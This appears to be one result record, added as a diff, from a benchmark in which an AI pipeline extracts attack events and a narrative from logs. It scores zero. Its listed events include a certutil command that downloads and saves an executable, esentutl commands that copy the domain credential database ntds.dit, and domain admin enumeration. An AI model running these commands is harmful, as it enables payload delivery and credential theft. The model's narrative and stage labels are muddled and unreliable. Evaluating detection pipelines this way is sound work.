@@ -1,0 +1,72 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\ WINDOWS\\ system32\\ smartscreen.exe - Embedding",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http :// example . com / x . exe C : \\ x . exe ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd / c esentutl.exe / y / vss c : \\ windows \\ ntds \\ ntds . dit / d c : \\ ntds . dit",
+        "stage": "Collection"
+      },
+      {
+        "command": "esentutl.exe / y / vss c : \\ windows \\ ntds \\ ntds . dit / d c : \\ ntds . dit",
+        "stage": "Collection"
+      },
+      {
+        "command": "net group \"domain admins\" /domain",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers started with an initial access through Smartscreen.exe, which likely downloaded malware onto the system. The malware then executed using certutil.exe, but the actual payload is unknown due to missing information. However, it's clear that some files were written to disk, suggesting persistence. One of those files might be related to the next steps. An investigation of the collection phase found two commands attempting to extract database contents from the SYSTEM hive, possibly indicating credential theft.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 92955,
+      "completion_tokens": 11448,
+      "total_tokens": 104403,
+      "wall_clock_s": 160.722,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 5,
+      "fn": 14
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 5,
+      "fn": 14,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.25,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 92955,
+      "completion_tokens": 11448,
+      "total_tokens": 104403,
+      "wall_clock_s": 160.722,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "v5_got_links",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": true
+  }
+}
